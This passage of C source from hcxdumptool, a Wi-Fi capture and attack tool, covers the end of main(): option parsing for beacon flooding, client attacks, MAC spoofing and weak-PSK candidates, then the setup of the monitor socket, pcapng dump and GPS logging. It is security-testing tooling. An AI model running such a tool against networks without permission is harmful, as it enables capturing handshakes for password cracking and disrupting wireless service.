		attackstatus |= DISABLE_CLIENT_ATTACKS;
		break;

		case HCX_FILTERLIST_AP:
		filteraplistname = optarg;
		break;

		case HCX_FILTERLIST_CLIENT:
		filterclientlistname = optarg;
		break;

		case HCX_FILTERMODE:
		filtermode = strtol(optarg, NULL, 10);
		break;

		case HCX_WEAKCANDIDATE:
		weakcandidateuser = optarg;
		weakcandidatelenuser = strlen(weakcandidateuser);
		if((weakcandidatelenuser < 8) || (weakcandidatelenuser > 63))
			{
			fprintf(stderr, "only length 8...63 characters allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_MAC_AP:
		if(strlen(optarg) != 12)
			{
			fprintf(stderr, "wrong mac format (allowed: 112233445566)\n");
			exit(EXIT_FAILURE);
			}
		mymac_ap = strtoull(optarg, NULL, 16);
		myoui_ap = (mymac_ap &0xffffff000000) >> 24;
		mynic_ap = mymac_ap &0xffffff;
		macmyapflag = true;
		break;

		case HCX_MAC_CLIENT:
		if(strlen(optarg) != 12)
			{
			fprintf(stderr, "wrong mac format (allowed: 112233445566)\n");
			exit(EXIT_FAILURE);
			}
		if(hex2bin(&optarg[0x0], mac_myclient, 6) == false)
			{
			fprintf(stderr, "wrong mac format (allowed: 112233445566)\n");
			exit(EXIT_FAILURE);
			}
		macmyclientflag = true;
		break;

		case HCX_EAPOL_TIMEOUT:
		eapoltimeoutvalue = strtol(optarg, NULL, 10);
		if(eapoltimeoutvalue <= 0)
			{
			fprintf(stderr, "EAPOL TIMEOUT must be > 0\n");
			exit(EXIT_FAILURE);
			}
		eapoltimeoutvalue *= 10000;
		break;

		case HCX_REACTIVE_BEACON:
		beaconreactiveflag = true;
		break;

		case HCX_ACTIVE_BEACON:
		beaconactiveflag = true;
		break;

		case HCX_FLOOD_BEACON:
		beaconfloodflag = true;
		break;

		case HCX_EXTAP_BEACON:
		extaplistname = optarg;
		break;

		case HCX_GPIO_BUTTON:
		gpiobutton = strtol(optarg, NULL, 10);
		if((gpiobutton < 2) || (gpiobutton > 27))
			{
			fprintf(stderr, "only 2...27 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_STATUSLED:
		gpiostatusled = strtol(optarg, NULL, 10);
		if((gpiostatusled < 2) || (gpiostatusled > 27))
			{
			fprintf(stderr, "only 2...27 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_TOT:
		totvalue = strtol(optarg, NULL, 10);
		if(totvalue < 2)
			{
			fprintf(stderr, "tot must be >= 2 (minutes)\n");
			exit(EXIT_FAILURE);
			}
		gettimeofday(&tvtot, NULL);
		tvtot.tv_sec += totvalue *60;
		break;

		case HCX_REBOOT:
		rebootflag = true;
		break;

		case HCX_POWER_OFF:
		poweroffflag = true;
		break;

		case HCX_STATUS:
		statusout |= strtol(optarg, NULL, 10);
		break;

		case HCX_CHECK_DRIVER:
		checkdriverflag = true;
		break;

		case HCX_SHOW_INTERFACES:
		showinterfaceflag = true;
		break;

		case HCX_SHOW_CHANNELS:
		showchannelsflag = true;
		break;

		case HCX_SERVER_PORT:
		mcsrvport = strtol(optarg, NULL, 10);
		if((mcsrvport < 1) || (mcsrvport > 65535))
			{
			fprintf(stderr, "port must be 1...65535\n");
			exit(EXIT_FAILURE);
			}
		statusout |= STATUS_SERVER;
		break;

		case HCX_CLIENT_PORT:
		mccliport = strtol(optarg, NULL, 10);
		if((mccliport < 1) || (mccliport > 65535))
			{
			fprintf(stderr, "port must be 1...65535\n");
			exit(EXIT_FAILURE);
			}
		statusout |= STATUS_CLIENT;
		break;

		case HCX_HELP:
		usage(basename(argv[0]));
		break;

		case HCX_VERSION:
		version(basename(argv[0]));
		break;

		case '?':
		usageerror(basename(argv[0]));
		break;
		}
	}

setbuf(stdout, NULL);
if(argc < 2)
	{
	fprintf(stderr, "no option selected\n");
	exit(EXIT_FAILURE);
	}

if((rebootflag == true) && (poweroffflag == true))
	{
	fprintf(stderr, "setting poweroff and reboot together is not allowed\n");
	exit(EXIT_FAILURE);
	}

if(showinterfaceflag == true)
	{
	show_wlaninterfaces();
	return EXIT_SUCCESS;
	}

printf("initialization...\n");
if(globalinit() == false)
	{
	fprintf(stderr, "initialization failed\n");
	errorcount++;
	globalclose();
	}

if(weakcandidateuser != NULL)
	{
	memcpy(&weakcandidate, weakcandidateuser, weakcandidatelenuser);
	weakcandidatelen = weakcandidatelenuser;
	}

if((statusout &STATUS_CLIENT) == STATUS_CLIENT)
	{
	if(openmcclisocket(mccliport) == true) process_server();
	process_server();
	globalclose();
	}

if(interfacename == NULL)
	{
	fprintf(stderr, "no interface specified\n");
	exit(EXIT_FAILURE);
	}

if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	globalclose();
	}

if(checkdriverflag == true) printf("starting driver test...\n");

if(filteraplistname != NULL) filteraplistentries = readfilterlist(filteraplistname, filteraplist); 
if(filterclientlistname != NULL) filterclientlistentries = readfilterlist(filterclientlistname, filterclientlist); 

if(opensocket() == false)
	{
	fprintf(stderr, "failed to init socket\nhcxdumptool need full and exclusive access to the adapter\n"
			"as well as write permission for the dumpfile\n"
			"that is not the case\n"
			"try to use ip link to bring interface down/up\n"
			"and iw to set monitor mode\n");
	errorcount++;
	globalclose();
	}

if((statusout &STATUS_SERVER) == STATUS_SERVER)
	{
	if(openmcsrvsocket(mcsrvport) == false)
		{
		errorcount++;
		globalclose();
		}
	}
if(showchannelsflag == true)
	{
	show_channels();
	globalclose();
	}

if(checkdriverflag == true)
	{
	cpa = 0;
	if(set_channel() == false) errorcount++;
	if(errorcount == 0) printf("driver tests passed...\nall required ioctl() system calls are supported by driver\n");
	globalclose();
	return EXIT_SUCCESS;
	}

if(extaplistname != NULL) readextbeaconlist(extaplistname);

if(pcapngoutname != NULL)
	{
	fd_pcapng = hcxcreatepcapngdump(pcapngoutname, mac_orig, interfacename, mac_myap, myrc, myanonce, mac_myclient, mysnonce, weakcandidatelen, weakcandidate);
	if(fd_pcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", pcapngoutname);
		errorcount++;
		globalclose();
		}
	}

if(nmeaoutname != NULL)
	{
	if((gpsname == NULL) && (gpsdflag == false)) 
		{
		fprintf(stderr, "no GPS device selected\n");
		errorcount++;
		globalclose();
		}
	if((fh_nmea = fopen(nmeaoutname, "a")) == NULL)
		{
		perror("failed to open NMEA 0183 dump file");
		errorcount++;
		globalclose();
		}
	setbuf(fh_nmea, NULL);
	}

if((gpsname != NULL) || (gpsdflag == true)) opengps();

if(rcascanflag == true) process_fd_rca();
else process_fd(); 

globalclose();
return EXIT_SUCCESS;
}
/*===========================================================================*/
